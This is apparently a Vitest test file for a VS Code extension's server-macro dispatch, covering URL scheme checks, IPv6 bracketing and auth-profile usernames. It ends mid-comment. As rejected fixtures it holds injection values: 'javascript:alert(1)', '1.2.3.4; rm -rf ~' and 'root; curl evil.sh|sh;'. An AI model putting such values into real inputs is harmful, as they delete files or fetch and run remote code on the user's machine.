import { beforeEach, describe, expect, it, vi } from "vitest";
import type { AuthProfile, ServerConfig } from "../../src/models/config";
import type { TerminalMacro } from "../../src/models/terminalMacro";
import type { CommandContext } from "../../src/commands/types";

const registeredCommands = new Map<string, (...args: unknown[]) => unknown>();
const showQuickPick = vi.fn();
const showWarningMessage = vi.fn();
const showErrorMessage = vi.fn();
const showInformationMessage = vi.fn();
const setStatusBarMessage = vi.fn();
const executeCommand = vi.fn();
const openExternal = vi.fn(async () => true);
const showInputBox = vi.fn();
const createdTerminals: Array<{ name: string; sent: string[]; env?: Record<string, string>; options: Record<string, unknown> }> = [];
let openTerminals: Array<{ name: string; sendText: (text: string, addNewLine?: boolean) => void; exitStatus?: unknown }> = [];

vi.mock("vscode", () => ({
  commands: {
    registerCommand: vi.fn((id: string, handler: (...args: unknown[]) => unknown) => {
      registeredCommands.set(id, handler);
      return { dispose: vi.fn() };
    }),
    executeCommand: (...args: unknown[]) => executeCommand(...args)
  },
  window: {
    showQuickPick: (...args: unknown[]) => showQuickPick(...args),
    showWarningMessage: (...args: unknown[]) => showWarningMessage(...args),
    showErrorMessage: (...args: unknown[]) => showErrorMessage(...args),
    showInformationMessage: (...args: unknown[]) => showInformationMessage(...args),
    setStatusBarMessage: (...args: unknown[]) => setStatusBarMessage(...args),
    createInputBox: vi.fn(),
    showInputBox: (...args: unknown[]) => showInputBox(...args),
    createTerminal: vi.fn((options: { name: string; env?: Record<string, string> }) => {
      // `env` is recorded as the raw option bag too, so a test can assert the
      // OPTION IS ABSENT rather than merely falsy — an implementation passing
      // `env: {}` would satisfy the second and not the first.
      const record = { name: options.name, sent: [] as string[], env: options.env, options: { ...options } };
      createdTerminals.push(record);
      return {
        name: options.name,
        show: vi.fn(),
        sendText: (text: string) => record.sent.push(text)
      };
    }),
    get terminals() {
      return openTerminals;
    },
    activeTerminal: undefined as unknown
  },
  env: {
    openExternal: (...args: unknown[]) => openExternal(...args)
  },
  Uri: {
    parse: (value: string) => ({ toString: () => value, value })
  },
  QuickInputButtons: { Back: {} }
}));

// The server-resolution helpers are exercised by serverCommands.test.ts; mocking
// them here keeps this file about macro dispatch and off the SSH/keygen imports.
const pickServer = vi.fn();
const connectServer = vi.fn(async () => {});
vi.mock("../../src/commands/serverCommands", () => ({
  pickServer: (...args: unknown[]) => pickServer(...args),
  connectServer: (...args: unknown[]) => connectServer(...args),
  toServerFromArg: (_core: unknown, arg: unknown) =>
    arg && typeof arg === "object" && "server" in arg ? (arg as { server: ServerConfig }).server : undefined
}));

import { collectIncomingMacros, sanitizeForSharing } from "../../src/commands/configCommands";
import { IPMI_GATEWAY_INERT_CREDENTIALS_HINT, stripImportedCapabilityFields } from "../../src/models/terminalMacro";
import { InMemoryMacroStore } from "../../src/storage/inMemoryMacroStore";
import { setActiveMacroStore } from "../../src/macroSettings";
import {
  buildServerMacroPicks,
  ipmiCredentialsOffNote,
  runMacroOnServer,
  sessionIpmiHintNote
} from "../../src/commands/serverMacroCommands";
import { MACRO_TEMPLATES } from "../../src/commands/macroCommands";
import { resolveMacroBrowserUrl } from "../../src/utils/browserUrl";

const store = new InMemoryMacroStore();

function server(overrides: Partial<ServerConfig> = {}): ServerConfig {
  return {
    id: "srv-1",
    name: "Core Switch",
    host: "10.1.2.3",
    port: 22,
    username: "admin",
    authType: "password",
    isHidden: false,
    ...overrides
  };
}

function context(overrides: Partial<CommandContext> = {}): CommandContext {
  return {
    core: {
      getSnapshot: () => ({ activeSessions: [], servers: [] }),
      getAuthProfile: () => undefined,
      onDidChange: () => () => {}
    },
    sessionTerminals: new Map(),
    ...overrides
  } as unknown as CommandContext;
}

/** A context whose auth-profile lookup answers with `profiles`, keyed by id. */
function contextWithAuthProfiles(profiles: AuthProfile[]): CommandContext {
  return context({
    core: {
      getSnapshot: () => ({ activeSessions: [], servers: [] }),
      getAuthProfile: (id: string) => profiles.find((p) => p.id === id),
      onDidChange: () => () => {}
    }
  } as unknown as Partial<CommandContext>);
}

function authProfile(overrides: Partial<AuthProfile> = {}): AuthProfile {
  return { id: "ap-1", name: "BMC accounts", username: "bmc-operator", authType: "password", ...overrides };
}

async function setMacros(macros: TerminalMacro[]): Promise<void> {
  await store.save(macros);
}

beforeEach(async () => {
  registeredCommands.clear();
  showQuickPick.mockReset();
  showInputBox.mockReset();
  showWarningMessage.mockReset();
  showErrorMessage.mockReset();
  showInformationMessage.mockReset();
  setStatusBarMessage.mockReset();
  executeCommand.mockReset();
  openExternal.mockClear();
  pickServer.mockReset();
  connectServer.mockReset();
  createdTerminals.length = 0;
  openTerminals = [];
  setActiveMacroStore(store);
  await store.clearAll();
});

describe("resolveMacroBrowserUrl", () => {
  it("accepts http and https", () => {
    expect(resolveMacroBrowserUrl("https://10.0.0.9/")).toBe("https://10.0.0.9/");
    expect(resolveMacroBrowserUrl("http://bmc.example.com/redfish")).toBe("http://bmc.example.com/redfish");
  });

  it("refuses every other scheme, and anything that is not a URL", () => {
    expect(resolveMacroBrowserUrl("javascript:alert(1)")).toBeUndefined();
    expect(resolveMacroBrowserUrl("file:///etc/passwd")).toBeUndefined();
    expect(resolveMacroBrowserUrl("vscode://extension/x")).toBeUndefined();
    expect(resolveMacroBrowserUrl("10.0.0.9")).toBeUndefined();
    expect(resolveMacroBrowserUrl("")).toBeUndefined();
  });
});

describe("buildServerMacroPicks", () => {
  it("sorts profile-token macros first without reordering the rest", async () => {
    const macros: TerminalMacro[] = [
      { id: "a", name: "Plain A", text: "show version\n" },
      { id: "b", name: "Uses profile", text: "ping ${profile.host}\n" },
      { id: "c", name: "Plain C", text: "show clock\n" }
    ];
    const picks = buildServerMacroPicks(macros, server());
    expect(picks.map((p) => p.label)).toEqual(["Uses profile", "Plain A", "Plain C"]);
  });

  it("lists a macro that needs an IPMI host the server lacks, and flags it", () => {
    const macros: TerminalMacro[] = [{ id: "a", name: "SOL", text: "ipmitool -H ${profile.ipmiHost}\n" }];
    const picks = buildServerMacroPicks(macros, server());
    // Listed, not hidden — hiding makes the feature undiscoverable.
    expect(picks).toHaveLength(1);
    expect(picks[0].issue?.token).toBe("ipmiHost");
    expect(picks[0].detail).toContain("IPMI / BMC Host");
  });

  it("does not flag it once the server has one", () => {
    const macros: TerminalMacro[] = [{ id: "a", name: "SOL", text: "ipmitool -H ${profile.ipmiHost}\n" }];
    const picks = buildServerMacroPicks(macros, server({ ipmiHost: "10.0.0.9" }));
    expect(picks[0].issue).toBeUndefined();
    expect(picks[0].detail).toBeUndefined();
  });

  it("redacts a secret macro's value and marks a prompting macro", () => {
    const macros: TerminalMacro[] = [
      { id: "a", name: "Password", text: "hunter2\n", secret: true },
      { id: "b", name: "Prompted", text: "ssh $user@host\n", variables: [{ name: "user" }] }
    ];
    const picks = buildServerMacroPicks(macros, server());
    expect(picks[0].description).toContain("***");
    expect(picks[0].description).not.toContain("hunter2");
    expect(picks[1].description).not.toBe("ssh $user@host\\n");
  });

  it("badges a macro that does not run in the session", () => {
    const macros: TerminalMacro[] = [{ id: "a", name: "BMC", text: "https://x/", runIn: "browser" }];
    expect(buildServerMacroPicks(macros, server())[0].description).toContain("[Browser]");
  });

  it("badges a gateway-routed local-terminal macro as [IPMI gateway], not [Local terminal] (issue #48 PR-C)", () => {
    // The picker passes the whole macro, so the route-aware badge surfaces the
    // execution host. Against 3c38972 this read `[Local terminal] `, hiding the
    // gateway run at selection time.
    const macros: TerminalMacro[] = [
      { id: "a", name: "SOL", text: "ipmitool -E sol activate\n", runIn: "localTerminal", route: "ipmiGateway" }
    ];
    const description = buildServerMacroPicks(macros, server())[0].description;
    expect(description).toContain("[IPMI gateway]");
    expect(description).not.toContain("[Local terminal]");
  });
});

describe("nexus.server.runMacro — dispatch", () => {
  it("opens an https URL for a browser macro, with the profile token filled in", async () => {
    await setMacros([{ id: "a", name: "BMC", text: "https://${profile.ipmiHost}/", runIn: "browser" }]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);

    await runMacroOnServer(context(), { server: server({ ipmiHost: "10.0.0.9" }) });

    expect(openExternal).toHaveBeenCalledTimes(1);
    expect((openExternal.mock.calls[0][0] as { value: string }).value).toBe("https://10.0.0.9/");
  });

  it("refuses a javascript: URL — nothing is opened and the failure is reported", async () => {
    await setMacros([{ id: "a", name: "Evil", text: "javascript:alert(1)", runIn: "browser" }]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);

    await runMacroOnServer(context(), { server: server() });

    expect(openExternal).not.toHaveBeenCalled();
    expect(showErrorMessage).toHaveBeenCalled();
    // Never claim a send for something that was refused.
    expect(setStatusBarMessage).not.toHaveBeenCalled();
  });

  it("reports a browser open the OS refused, and never claims it was sent", async () => {
    // REVIEW FINDING (P2) — `openExternal` resolves to a BOOLEAN, and `false` is
    // a real outcome (no handler for the scheme, or the user dismissed the
    // "allow this extension to open a URI?" trust prompt). The pre-fix target
    // returned a hardcoded `true`, so this run ended in `Macro "BMC" sent to the
    // browser.` with nothing open anywhere.
    await setMacros([{ id: "a", name: "BMC", text: "https://${profile.ipmiHost}/", runIn: "browser" }]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);
    openExternal.mockResolvedValueOnce(false as unknown as true);

    await runMacroOnServer(context(), { server: server({ ipmiHost: "10.0.0.9" }) });

    expect(openExternal).toHaveBeenCalledTimes(1);
    // No success claim — this is what the always-true return produced.
    expect(setStatusBarMessage).not.toHaveBeenCalled();
    // Reported EXACTLY ONCE: `runMacroWithTarget` treats a `false` send as
    // "the target already said why" and stays silent, so the target must speak.
    expect(showWarningMessage).toHaveBeenCalledTimes(1);
    expect(String(showWarningMessage.mock.calls[0][0])).toBe('Could not open "BMC" in the browser.');
  });

  it("says nothing extra when the browser open succeeds", async () => {
    await setMacros([{ id: "a", name: "BMC", text: "https://${profile.ipmiHost}/", runIn: "browser" }]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);

    await runMacroOnServer(context(), { server: server({ ipmiHost: "10.0.0.9" }) });

    expect(showWarningMessage).not.toHaveBeenCalled();
    expect(String(setStatusBarMessage.mock.calls[0][0])).toBe('Macro "BMC" sent to the browser.');
  });

  it("runs a localTerminal macro in a fresh terminal, never through sendSequence", async () => {
    await setMacros([
      { id: "a", name: "SOL", text: " ipmitool -H ${profile.ipmiHost} sol activate\n", runIn: "localTerminal" }
    ]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);

    await runMacroOnServer(context(), { server: server({ ipmiHost: "10.0.0.9" }) });

    expect(createdTerminals).toHaveLength(1);
    expect(createdTerminals[0].sent).toEqual([" ipmitool -H 10.0.0.9 sol activate\n"]);
    // `workbench.action.terminal.sendSequence` targets whatever terminal is
    // focused — the exact mis-delivery this command exists to avoid.
    expect(executeCommand).not.toHaveBeenCalledWith("workbench.action.terminal.sendSequence", expect.anything());
  });

  it("unescapes $${profile.host} EXACTLY ONCE on the server path — never twice", async () => {
    // The other side of the P2 fix. `unescapeProfileTokens()` was added to every
    // send path that does NOT go through `resolveProfileTokens()`; this path
    // does, so applying it again (e.g. by moving the unescape into the shared
    // `resolveMacroText`) would turn `$$${profile.host}` into a resolved VALUE
    // instead of the literal token the escape promises.
    await setMacros([
      { id: "a", name: "Docs", text: "echo $${profile.host} / $$${profile.host}\n", runIn: "localTerminal" }
    ]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);

    await runMacroOnServer(context(), { server: server({ host: "10.1.2.3" }) });

    expect(createdTerminals).toHaveLength(1);
    // One `$` dropped per token, once. A second pass would yield
    // `echo 10.1.2.3 / ${profile.host}`.
    expect(createdTerminals[0].sent).toEqual(["echo ${profile.host} / $${profile.host}\n"]);
    expect(createdTerminals[0].sent[0]).not.toContain("10.1.2.3");
  });

  it("refuses a macro whose ipmiHost the server lacks, and offers Edit Server", async () => {
    await setMacros([{ id: "a", name: "SOL", text: "ipmitool -H ${profile.ipmiHost}\n", runIn: "localTerminal" }]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);
    showErrorMessage.mockResolvedValue("Edit Server");

    const target = server();
    await runMacroOnServer(context(), { server: target });

    // Nothing sent anywhere — not a literal token, not an empty -H argument.
    expect(createdTerminals).toHaveLength(0);
    expect(String(showErrorMessage.mock.calls[0][0])).toContain("IPMI / BMC Host");
    // `expandAdvanced` — "IPMI / BMC Host" lives behind the form's Advanced
    // section, so the button must open it rather than land on a collapsed field.
    expect(executeCommand).toHaveBeenCalledWith("nexus.server.edit", { server: target, expandAdvanced: true });
  });

  it("refuses a host that carries shell syntax before anything is run", async () => {
    await setMacros([{ id: "a", name: "Ping", text: "ping ${profile.host}\n", runIn: "localTerminal" }]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);
    showErrorMessage.mockResolvedValue(undefined);

    await runMacroOnServer(context(), { server: server({ host: "1.2.3.4; rm -rf ~" }) });

    expect(createdTerminals).toHaveLength(0);
    expect(showErrorMessage).toHaveBeenCalled();
  });

  it("sends a session macro to THIS server's session terminal, not the active terminal", async () => {
    await setMacros([{ id: "a", name: "Version", text: "show version\n" }]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);

    const sent: string[] = [];
    const sessionTerminal = { name: "Nexus SSH: Core Switch", sendText: (text: string) => sent.push(text) };
    const otherTerminal = { name: "Some other host", sendText: () => expect.unreachable("wrong terminal") };
    openTerminals = [otherTerminal, sessionTerminal];

    const ctx = context({
      core: {
        getSnapshot: () => ({ activeSessions: [{ id: "sess-1", serverId: "srv-1" }], servers: [] }),
        onDidChange: () => () => {}
      },
      sessionTerminals: new Map([["sess-1", sessionTerminal]])
    } as unknown as Partial<CommandContext>);

    await runMacroOnServer(ctx, { server: server() });

    expect(sent).toEqual(["show version\n"]);
  });

  it("offers to connect first when the server has no session, and sends nothing if declined", async () => {
    await setMacros([{ id: "a", name: "Version", text: "show version\n" }]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);
    showWarningMessage.mockResolvedValue(undefined);

    await runMacroOnServer(context(), { server: server() });

    expect(String(showWarningMessage.mock.calls[0][0])).toContain("not connected");
    expect(connectServer).not.toHaveBeenCalled();
    expect(setStatusBarMessage).not.toHaveBeenCalled();
  });

  it("runs a preselected macro without ever showing the macro picker", async () => {
    // The redirect from `nexus.macro.run` / a keybinding already knows WHICH
    // macro — it only lacks a server. Re-asking would cost the user the
    // selection they just made.
    await setMacros([
      { id: "a", name: "Other", text: "show version\n" },
      { id: "b", name: "BMC", text: "https://${profile.ipmiHost}/", runIn: "browser" }
    ]);

    await runMacroOnServer(context(), { server: server({ ipmiHost: "10.0.0.9" }), macro: { id: "b" } });

    expect(showQuickPick).not.toHaveBeenCalled();
    expect(openExternal).toHaveBeenCalledTimes(1);
    expect((openExternal.mock.calls[0][0] as { value: string }).value).toBe("https://10.0.0.9/");
  });

  it("prefers the STORED record over the macro object the caller was holding", async () => {
    // The caller's copy can be stale — the store is the source of truth for what
    // running this macro does.
    await setMacros([{ id: "b", name: "BMC", text: "https://${profile.ipmiHost}/edited", runIn: "browser" }]);

    await runMacroOnServer(context(), {
      server: server({ ipmiHost: "10.0.0.9" }),
      macro: { id: "b", name: "BMC", text: "https://stale.example.com/", runIn: "browser" }
    });

    expect((openExternal.mock.calls[0][0] as { value: string }).value).toBe("https://10.0.0.9/edited");
  });

  it("still opens the picker for a server argument that names no macro", async () => {
    await setMacros([{ id: "a", name: "Version", text: "show version\n" }]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);
    showWarningMessage.mockResolvedValue(undefined);

    await runMacroOnServer(context(), { server: server() });

    expect(showQuickPick).toHaveBeenCalled();
  });

  it("points at the templates when there are no macros at all", async () => {
    showInformationMessage.mockResolvedValue("Add From Template…");

    await runMacroOnServer(context(), { server: server() });

    expect(String(showInformationMessage.mock.calls[0][0])).toContain("IPMI templates");
    // Both routes offered; the template one is what this command exists for.
    expect(showInformationMessage.mock.calls[0].slice(1)).toEqual(["Add From Template…", "Add Blank Macro"]);
    expect(executeCommand).toHaveBeenCalledWith("nexus.macro.addFromTemplate");
  });

  it("offers Edit Macro when a browser macro's text is not a URL", async () => {
    await setMacros([{ id: "a", name: "Evil", text: "javascript:alert(1)", runIn: "browser" }]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);
    showErrorMessage.mockResolvedValue("Edit Macro");

    await runMacroOnServer(context(), { server: server() });

    // The fix is in the macro's text, so the repair button opens the macro —
    // the mirror of the Edit Server button on a profile-token refusal.
    expect(showErrorMessage.mock.calls[0][1]).toBe("Edit Macro");
    expect(executeCommand).toHaveBeenCalledWith(
      "nexus.macro.edit",
      expect.objectContaining({ index: 0 })
    );
  });

  it("falls back to the server picker when invoked from the palette", async () => {
    await setMacros([{ id: "a", name: "BMC", text: "https://${profile.ipmiHost}/", runIn: "browser" }]);
    pickServer.mockResolvedValue(server({ ipmiHost: "10.0.0.9" }));
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);

    await runMacroOnServer(context(), undefined);

    expect(pickServer).toHaveBeenCalled();
    expect(openExternal).toHaveBeenCalledTimes(1);
  });
});

/**
 * REVIEW FINDING (P2) — A BARE IPv6 HOST BROKE EVERY BROWSER MACRO. `fe80::1` is
 * a legal, unbracketed value for `host` / `ipmiHost` — the form an SSH host
 * takes and the form `ipmitool -H` needs — but substituted into the shipped
 * `https://${profile.ipmiHost}/` it produced `https://fe80::1/`, which
 * `new URL()` rejects. `resolveMacroBrowserUrl()` then refused the run with "its
 * text is not an http:// or https:// URL", pointing the user at the macro text,
 * which was never the problem. Substitution is now told what the resolved text
 * IS, so a browser macro writes the address in URL-authority form.
 */
describe("nexus.server.runMacro — IPv6 addresses in a browser macro", () => {
  const BMC_MACRO: TerminalMacro = { id: "a", name: "BMC", text: "https://${profile.ipmiHost}/", runIn: "browser" };

  /** The URL the run actually handed to `openExternal`, or `undefined`. */
  function openedUrl(): string | undefined {
    const call = openExternal.mock.calls[0];
    return call ? (call[0] as { value: string }).value : undefined;
  }

  async function runBrowserMacro(ipmiHost: string): Promise<void> {
    await setMacros([BMC_MACRO]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);
    await runMacroOnServer(context(), { server: server({ ipmiHost }) });
  }

  it("brackets a bare IPv6 literal, and the browser is actually opened", async () => {
    await runBrowserMacro("fe80::1");

    expect(openedUrl()).toBe("https://[fe80::1]/");
    expect(openExternal).toHaveBeenCalledTimes(1);
    // The pre-fix outcome, asserted as its absence: nothing opened and the user
    // sent to Edit Macro over text that was correct all along.
    expect(showErrorMessage).not.toHaveBeenCalled();
    expect(String(setStatusBarMessage.mock.calls[0][0])).toBe('Macro "BMC" sent to the browser.');
  });

  it("does not double-bracket a value already stored bracketed", async () => {
    await runBrowserMacro("[fe80::1]");
    expect(openedUrl()).toBe("https://[fe80::1]/");
  });

  it("keeps a bracketed IPv6 with a port exactly as stored", async () => {
    await runBrowserMacro("[fe80::1]:623");
    expect(openedUrl()).toBe("https://[fe80::1]:623/");
  });

  it("does not treat a host:port colon as IPv6", async () => {
    // `bmc.example.com:8443` contains a colon and is not an address literal —
    // bracketing it would break a macro that works today.
    await runBrowserMacro("bmc.example.com:8443");
    expect(openedUrl()).toBe("https://bmc.example.com:8443/");
  });

  it("leaves a localTerminal macro's address alone — no brackets on a command line", async () => {
    // The context-blind fix (always bracket) breaks exactly this: the shipped
    // IPMI SOL template is a localTerminal macro and `ipmitool -H [fe80::1]` is
    // not what it wants.
    await setMacros([
      { id: "s", name: "SOL", text: " ipmitool -H ${profile.ipmiHost} sol activate\n", runIn: "localTerminal" }
    ]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);

    await runMacroOnServer(context(), { server: server({ ipmiHost: "fe80::1" }) });

    expect(createdTerminals[0].sent).toEqual([" ipmitool -H fe80::1 sol activate\n"]);
  });

  it("leaves a session macro's address alone too", async () => {
    await setMacros([{ id: "s", name: "Ping", text: "ping ${profile.host}\n", runIn: "session" }]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);

    const sent: string[] = [];
    const sessionTerminal = { name: "Nexus SSH: Core Switch", sendText: (text: string) => sent.push(text) };
    openTerminals = [sessionTerminal];
    const ctx = context({
      core: {
        getSnapshot: () => ({ activeSessions: [{ id: "sess-1", serverId: "srv-1" }], servers: [] }),
        getAuthProfile: () => undefined,
        onDidChange: () => () => {}
      },
      sessionTerminals: new Map([["sess-1", sessionTerminal]])
    } as unknown as Partial<CommandContext>);

    await runMacroOnServer(ctx, { server: server({ host: "fe80::1" }) });

    expect(sent).toEqual(["ping fe80::1\n"]);
  });

  it("agrees between the picker's flag and the run — an IPv6 server flags nothing and opens", async () => {
    // The flag and the outcome are both `resolveProfileTokens` on the same
    // server AND the same form, so they cannot disagree. A picker built in
    // command form while the run resolves in URL form (or the reverse) is the
    // drift this pins.
    await setMacros([BMC_MACRO]);
    let listed: Array<{ issue?: { token: string } }> = [];
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro; issue?: { token: string } }>) => {
      listed = items;
      return items[0];
    });

    await runMacroOnServer(context(), { server: server({ ipmiHost: "fe80::1" }) });

    // No warning in the picker…
    expect(listed[0].issue).toBeUndefined();
    // …and the run backs that up: it opened, rather than erroring out.
    expect(openedUrl()).toBe("https://[fe80::1]/");
    expect(showErrorMessage).not.toHaveBeenCalled();
  });

  it("still flags and refuses an IPv6-shaped value that is not an address", async () => {
    // URL form is a rendering decision, never a permission one: `[abc]` is a
    // bracket expression, refused in both forms, and the picker says so.
    await setMacros([BMC_MACRO]);
    let listed: Array<{ issue?: { token: string } }> = [];
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro; issue?: { token: string } }>) => {
      listed = items;
      return items[0];
    });
    showErrorMessage.mockResolvedValue(undefined);

    await runMacroOnServer(context(), { server: server({ ipmiHost: "[abc]" }) });

    expect(listed[0].issue?.token).toBe("ipmiHost");
    expect(openExternal).not.toHaveBeenCalled();
    expect(showErrorMessage).toHaveBeenCalled();
  });
});

/**
 * REVIEW FINDING (P2) — an unknown `${profile.…}` token is a warning, never a
 * failure, so the only question is WHEN it is said. It used to be said the
 * instant the tokens resolved: before the prompt walk, before the "connect
 * first?" confirmation and before the browser URL check — each of which can
 * abort, leaving the user told about text that was never sent — and, when the
 * send did happen, the success status replaced it in the same tick, so nobody
 * ever read it. It now rides along with the delivery report.
 */
describe("nexus.server.runMacro — unknown profile tokens are reported WITH the delivery", () => {
  /** `xyz` is not in the whitelist, so it is passed through verbatim and warned about. */
  const UNKNOWN_TOKEN_MACRO: TerminalMacro = {
    id: "u",
    name: "Typo",
    text: "ipmitool -H ${profile.xyz}\n",
    runIn: "localTerminal"
  };

  function statusMessages(): string[] {
    return setStatusBarMessage.mock.calls.map((call) => String(call[0]));
  }

  it("says it once, with the send confirmation, when the text is delivered", async () => {
    await setMacros([UNKNOWN_TOKEN_MACRO]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);

    await runMacroOnServer(context(), { server: server() });

    // The token went out verbatim — that is the documented behaviour.
    expect(createdTerminals[0].sent).toEqual(["ipmitool -H ${profile.xyz}\n"]);
    // ONE message, combining outcome and caveat. The pre-fix implementation
    // produced two, the caveat first and immediately overwritten.
    expect(statusMessages()).toEqual([
      'Macro "Typo" sent to a local terminal — unknown profile token ${profile.xyz} was sent as-is.'
    ]);
  });

  it("pluralises, and lists each unknown token once", async () => {
    await setMacros([
      { id: "u2", name: "Typos", text: "${profile.xyz} ${profile.abc} ${profile.xyz}\n", runIn: "localTerminal" }
    ]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);

    await runMacroOnServer(context(), { server: server() });

    expect(statusMessages()).toEqual([
      'Macro "Typos" sent to a local terminal — unknown profile tokens ${profile.xyz}, ${profile.abc} were sent as-is.'
    ]);
  });

  it("says nothing when the run is abandoned before anything is sent", async () => {
    // A session macro on a disconnected server: the "connect first?" prompt is
    // declined, so nothing is delivered. The pre-fix implementation had already
    // announced what "was sent as-is" by this point.
    await setMacros([{ ...UNKNOWN_TOKEN_MACRO, runIn: "session" }]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);
    showWarningMessage.mockResolvedValue(undefined);

    await runMacroOnServer(context(), { server: server() });

    expect(connectServer).not.toHaveBeenCalled();
    expect(createdTerminals).toHaveLength(0);
    expect(statusMessages()).toEqual([]);
  });

  it("says nothing when the browser target refuses the text", async () => {
    // The other post-resolution abort: a `browser` macro whose text is not an
    // http(s) URL never opens anything.
    await setMacros([{ id: "u3", name: "Typo", text: "javascript:alert(${profile.xyz})", runIn: "browser" }]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);
    showErrorMessage.mockResolvedValue(undefined);

    await runMacroOnServer(context(), { server: server() });

    expect(openExternal).not.toHaveBeenCalled();
    expect(statusMessages()).toEqual([]);
  });

  it("leaves the confirmation alone when every token is known", async () => {
    await setMacros([{ id: "k", name: "SOL", text: "ipmitool -H ${profile.host}\n", runIn: "localTerminal" }]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);

    await runMacroOnServer(context(), { server: server() });

    expect(statusMessages()).toEqual(['Macro "SOL" sent to a local terminal.']);
  });
});

/**
 * REVIEW FINDING (P2) — `${profile.username}` must name the account a SESSION
 * would log in as. A linked auth profile takes the username over at connect time
 * (`SilentAuthSshFactory.resolveServer` spreads `authProfileOwnedCredentials`),
 * while the server keeps its own stored underneath the link — so reading
 * `server.username` here puts the wrong account on the command line, in exactly
 * the shipped `ipmitool -U ${profile.username}` case.
 */
describe("nexus.server.runMacro — ${profile.username} and linked auth profiles", () => {
  const USERNAME_MACRO: TerminalMacro = {
    id: "u",
    name: "SOL",
    text: "ipmitool -U ${profile.username} sol activate\n",
    runIn: "localTerminal"
  };

  it("resolves to the LINKED PROFILE's username, not the one stored on the server", async () => {
    await setMacros([USERNAME_MACRO]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);

    await runMacroOnServer(contextWithAuthProfiles([authProfile({ username: "bmc-operator" })]), {
      // The server's own username survives beneath the link and differs — this
      // fixture is the whole point: reading `server.username` sends "admin".
      server: server({ username: "admin", authProfileId: "ap-1" })
    });

    expect(createdTerminals[0].sent).toEqual(["ipmitool -U bmc-operator sol activate\n"]);
  });

  it("uses the server's own username when there is no link", async () => {
    await setMacros([USERNAME_MACRO]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);

    await runMacroOnServer(contextWithAuthProfiles([authProfile()]), { server: server({ username: "admin" }) });

    expect(createdTerminals[0].sent).toEqual(["ipmitool -U admin sol activate\n"]);
  });

  it("falls back to the server's username when the linked profile supplies none", async () => {
    // The connect path's precedence, mirrored exactly: `authProfileOwnedCredentials`
    // owns `username` only when the profile supplies a USABLE one, so a blank or
    // whitespace-only username (reachable through an imported backup) leaves the
    // server's own standing rather than blanking it.
    await setMacros([USERNAME_MACRO]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);

    await runMacroOnServer(contextWithAuthProfiles([authProfile({ username: "   " })]), {
      server: server({ username: "admin", authProfileId: "ap-1" })
    });

    expect(createdTerminals[0].sent).toEqual(["ipmitool -U admin sol activate\n"]);
  });

  it("falls back to the server's username when the link resolves to no profile at all", async () => {
    await setMacros([USERNAME_MACRO]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);

    await runMacroOnServer(contextWithAuthProfiles([]), {
      server: server({ username: "admin", authProfileId: "ap-gone" })
    });

    expect(createdTerminals[0].sent).toEqual(["ipmitool -U admin sol activate\n"]);
  });

  it("checks the PROFILE's username against the charset, and refuses the run", async () => {
    // The effective value flows through the same `username` charset check — that
    // is the point: an auth profile is as importable as a server record, and the
    // resolved line runs on the user's own machine.
    await setMacros([USERNAME_MACRO]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);
    showErrorMessage.mockResolvedValue(undefined);

    await runMacroOnServer(contextWithAuthProfiles([authProfile({ username: "root; curl evil.sh|sh;" })]), {
      server: server({ username: "admin", authProfileId: "ap-1" })
    });

    expect(createdTerminals).toHaveLength(0);
    expect(showErrorMessage).toHaveBeenCalled();
    // Refused on the profile's value — never quietly resolved to the server's.
    expect(String(showErrorMessage.mock.calls[0][0])).toContain("root; curl evil.sh|sh;");
  });

  it("flags the picker entry against the EFFECTIVE username too, so flag and refusal agree", async () => {
    await setMacros([USERNAME_MACRO]);
    let listed: Array<{ issue?: { token: string } }> = [];
    showQuickPick.mockImplementation(async (items: Array<{ issue?: { token: string } }>) => {
      listed = items;
      return undefined;
    });

    await runMacroOnServer(contextWithAuthProfiles([authProfile({ username: "bad name" })]), {
      // A perfectly legal `server.username`: only the profile's value is bad, so
      // a picker built from the raw record would show no warning at all.
      server: server({ username: "admin", authProfileId: "ap-1" })
    });

    expect(listed[0].issue?.token).toBe("username");
  });
});

/**
 * REVIEW FINDING (P2) — the connect-first flow's three endings.
 *
 * `SshPty.start()` CATCHES its own initial-connect errors: on a refused
 * password or an unreachable host the terminal stays open holding a "Connection
 * failed / press any key to close" notice, the pty is not disposed, no session
 * is registered and nothing closes. The flow therefore had no failure signal at
 * all and sat out the whole 90-second watchdog before claiming it had
